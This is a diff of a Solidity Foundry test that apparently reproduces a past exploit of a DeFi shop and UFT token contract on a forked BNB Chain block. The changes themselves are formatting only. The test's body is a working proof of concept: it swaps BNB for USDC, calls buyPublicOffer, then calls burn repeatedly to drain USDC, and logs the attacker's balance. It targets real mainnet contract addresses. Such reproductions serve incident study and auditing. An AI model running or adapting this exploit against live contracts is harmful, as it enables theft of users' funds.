@@ -13,11 +13,16 @@ interface SHOP {
     function buyPublicOffer(address _dao, uint256 _lpAmount) external;
 }
 
-interface IUFT is IERC20{
-    function burn(uint256 _amount, address[] memory _tokens, address[] memory _adapters, address[] memory _pools) external;
+interface IUFT is IERC20 {
+    function burn(
+        uint256 _amount,
+        address[] memory _tokens,
+        address[] memory _adapters,
+        address[] memory _pools
+    ) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     SHOP shop = SHOP(0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366);
     IUFT UFT = IUFT(0xf887A2DaC0DD432997C970BCE597A94EaD4A8c25);
@@ -28,7 +33,7 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 24705058); 
+        cheats.createSelectFork("bsc", 24_705_058);
         cheats.label(address(shop), "SHOP");
         cheats.label(address(USDC), "USDC");
         cheats.label(address(UFT), "UFT");
@@ -36,25 +41,28 @@ contract ContractTest is DSTest{
     }
 
     function testExploit() external {
-        address [] memory path = new address[](2);
+        address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(USDC);
-        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(1, path, address(this), block.timestamp);
-        USDC.approve(address(shop), type(uint).max);
-        uint amount = USDC.balanceOf(address(this));
+        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(
+            1, path, address(this), block.timestamp
+        );
+        USDC.approve(address(shop), type(uint256).max);
+        uint256 amount = USDC.balanceOf(address(this));
         shop.buyPublicOffer(UF, amount);
-        address [] memory tokens = new address[](1);
+        address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
         address[] memory adapters = new address[](0);
         address[] memory pools = new address[](0);
         UFT.burn(amount, tokens, adapters, pools);
-        amount = 1_000 * 1e18;
+        amount = 1000 * 1e18;
         shop.buyPublicOffer(UF, amount);
         UFT.burn(amount, tokens, adapters, pools);
 
-        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+        );
     }
 
-    receive() payable external{}
-
+    receive() external payable {}
 }
